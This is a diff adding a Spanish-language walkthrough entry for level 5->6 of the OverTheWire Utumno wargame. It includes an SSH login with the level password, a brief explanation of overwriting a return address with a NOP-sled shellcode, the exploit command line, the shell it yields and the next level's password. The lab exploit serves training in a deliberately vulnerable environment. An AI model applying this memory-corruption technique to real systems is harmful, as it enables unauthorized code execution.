@@ -98,3 +98,15 @@ $ cat /etc/utumno_pass/utumno6
 eiluquieth
 La contraseña fue o es .: eiluquieth
 
+LEVEL 5->6
+ENTRAMOS ssh utumno6@utumno.labs.overthewire.org -p 2227
+Contraseña: eiluquieth
+nos dio un tipo de almacenamiento valor de clave , el codigp realiza una convgersion de los argumentos ,,entonces usamos el segundo argumento como dirreccion de retorno, tomamos un valor que sea valido como 0xffffd628 y exportamos una shellcode  con un sled nop,, encontramos la  dirreccion de la sled y la ponemos como 3er argumento y finalmente añadimos bytes al 2do argm para tener las shell y nos da de resultado 
+utumno6@utumno:/utumno$ ./utumno6 -1 0xffffd518 $(python -c "print '\xcc\xdd\xff\xff'")
+$ whoami
+utumno7
+$ cat /etc/utumno_pass/utumno7
+totiquegae
+La contraseña es ::totiquegae
+
+
